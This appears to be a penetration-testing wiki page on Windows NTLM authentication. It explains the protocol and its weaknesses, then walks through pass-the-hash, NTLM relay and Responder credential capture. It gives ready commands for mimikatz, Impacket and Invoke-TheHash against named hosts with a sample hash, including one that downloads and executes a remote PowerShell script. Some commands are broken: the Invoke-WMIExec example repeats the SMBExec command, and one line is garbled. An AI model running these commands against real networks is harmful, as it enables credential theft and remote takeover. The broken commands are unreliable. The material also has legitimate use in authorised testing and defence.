# NTLM

## Basic Information

**NTLM Credentials**: Domain name \(if any\), username and password hash.

**LM** is only **enabled** in **Windows XP and server 2003** \(LM hashes can be cracked\). The LM hash AAD3B435B51404EEAAD3B435B51404EE means that LM is not being used \(is the LM hash of empty string\).

By default **Kerberos** is **used**, so NTLM will only be used if **there isn't any Active Directory configured,** the **Domain doesn't exist**, **Kerberos isn't working** \(bad configuration\) or the **client** that tries to connect using the IP instead of a valid host-name.

The **network packets** of a **NTLM authentication** have the **header** "**NTLMSSP**".

The protocols: LM, NTLMv1 and NTLMv2 are supported in the DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 and NTLMv2

You can check and configure which protocol will be used:

### GUI

Execute _secpol.msc_ -&gt; Local policies -&gt; Security Options -&gt; Network Security: LAN Manager authentication level. There are 6 levels \(from 0 to 5\).

![](../../.gitbook/assets/image%20%2875%29.png)

### Registry

This will set the level 5:

```text
reg add HKLM\SYSTEM\CurrentControlSet\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

## Basic NTLM Domain authentication Scheme

1. The **user** introduces his **credentials**
2. The client machine **sends an authentication request** sending the **domain name** and the **username**
3. The **server** sends the **challenge**
4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
6. The **domain controller checks if everything is correct** and sends the information to the server

The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server \(it is inside the **NTDS.DIT** db\).

### Local NTLM authentication Scheme

The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.

### NTLMv1 Challenge

The **challenge length is 8 bytes** and the **response is 24 bytes** long.

The **hash NT \(16bytes\)** is divided in **3 parts of 7bytes each** \(7B + 7B + \(2B+0x00\*5\)\): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

* Lack of **randomness**
* The 3 parts can be **attacked separately** to find the NT hash
* **DES is crackable**
* The 3º key is composed always by **5 zeros**.
* Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.

### NTLMv2 Challenge

The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.

**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.

The **second response** is created using **several values** \(a new client challenge, a **timestamp** to avoid **replay attacks**...\)

If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Once you have the hash of the victim**, you can use it to **impersonate** it.  
You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.

**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**

### **Mimikatz**

**Needs to be run as administrator**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
```

This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user \(similar to the `runas /netonly` trick but you don't need to know the plain-text password\).

### Pass-the-Hash from linux

You can obtain code execution in Windows machines using Pass-the-Hash from Linux.   
[**Access here to learn how to do it.**](../../pentesting/pentesting-smb.md#execute)\*\*\*\*

### Impacket Windows compiled tools

You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** \(In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell\)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* There are several more Impacket binaries...

### Invoke-TheHash

You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec

```text
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```text
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```text
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```text
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use \(_SMBExec, WMIExec, SMBClient, SMBEnum_\). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.

```text
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor \(WCE\)

**Needs to be run as administrator**

This tool will do the same thing as mimikatz \(modify LSASS memory\).

```text
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Manual Windows remote execution with username and password

* \*\*\*\*[**PsExec**](psexec-and-winexec.md)\*\*\*\*
* [**SmbExec**](smbexec.md)\*\*\*\*
* \*\*\*\*[**WmicExec**](wmicexec.md)\*\*\*\*
* \*\*\*\*[**AtExec**](atexec.md)\*\*\*\*

## Extracting credentials from a Windows Host

**For more information about** [**how to obtain credentials from a Windows host you should read this page**](../stealing-credentials/)**.**

## More about NTLM Relay and Responder

**Read** [**here a more detailed guide**](../../pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) **on howto perform those attacks**

## NTLM relay

Because of how the NTLM authentication behaves, if you could make a **client to authenticate against you**, you could **use its credentials to access another machine**. This will work by sending the **same challenge** that the **server sends to you to the victim**, and send the **response of the challenge of the victim to the server**. You won't even need to crack the challenge response of the victim because you will use it to connect to another machine.

You can perform this attack using **metasploit module**: `exploit/windows/smb/smb_relay`

The  option `SRVHOST` is used to point the server **were you want to get access**.  
Then, when **any host try to authenticate against you**, metasploit will **try to authenticate against the other** server.

You **can't authenticate against the same host that is trying to authenticate against you** \(MS08-068\). **Metasploit** will **always** send a "_**Denied**_" **response** to the **client** that is trying to connect to you.

You can also perform this attack using the **impacket tool**: _**smbrelayx.py**_

```text
smbrelayx.py .h <HOST_to_attack> [-c <Command_to_exec>] [-e <path_to_binary_to_exec>]
```

This **attack can be easily solved implementing SMB** _**Signing**_ \(by default only Windows servers implements that option\).

Read: [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)

## Getting Credentials with Responder

Responder will create a lot of services that can **capture credentials when someone try to access them**. It can also send **fake DNS responses** \(so the IP of the attacker is resolved\) and can inject **PAC files** so the victim will get the IP of the **attacker as a proxy**.

```text
responder.py -I <interface> -w On #If the computer detects the LAN configuration automatically, this will impersonate it
```

You can also **resolve NetBIOS** requests with **your IP**. And create an **authentication proxy**:

```text
responder.py -I <interface> -rPv
```

You won't be able to intercept NTLM hashes \(normally\), but you can easly grab some **NTLM challenges and responses** that you can **crack** using for example _**john**_ option `--format=netntlmv2`.

The **logs and the challenges** of default _**Responder**_ installation in kali can be found in `/usr/share/responder/logs`

## Parse NTLM challenges from a network capture

**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)\*\*\*\*

